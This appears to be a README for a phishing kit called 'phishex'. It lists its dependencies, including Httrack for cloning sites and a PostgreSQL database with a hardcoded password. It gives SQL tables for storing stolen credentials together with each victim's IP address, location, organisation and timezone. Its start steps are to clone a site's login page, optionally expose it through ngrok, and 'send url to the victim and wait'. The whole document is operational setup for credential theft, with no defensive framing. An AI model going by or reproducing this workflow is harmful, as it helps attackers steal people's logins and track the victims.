<b>REQUIERMENTS</b>
<br>
<p>
Python 3.0><br>

Httrack<br>

Apache TOMCAT 9.*<br>

Postgresql database:<br>
Database name: phishex<br>
user: phx<br>
password: phishex_666<br>
	
	Scripts:

	create table Credentials(
	id serial primary key,
	site varchar(64) not null,
	data text,          
	sys_info_id integer references SysInfo(id));

	create table SysInfo(    
	id serial primary key,
	ip varchar(32) not null,  
	country varchar(32),
	city varchar(32),                           
	location varchar(64),
	organization varchar(64),
	postal varchar(16),
	timezone varchar(64));
</p>
<br>
<b>START</b><br>
<p>
1) Run server.py script<br>
2) Run application<br>
3) Enter site login page url and click [Grab it]<br>
4) (OPTIONAL) run .ngrok on port 80<br>
5) Send url to the victim and wait<br>
</p>
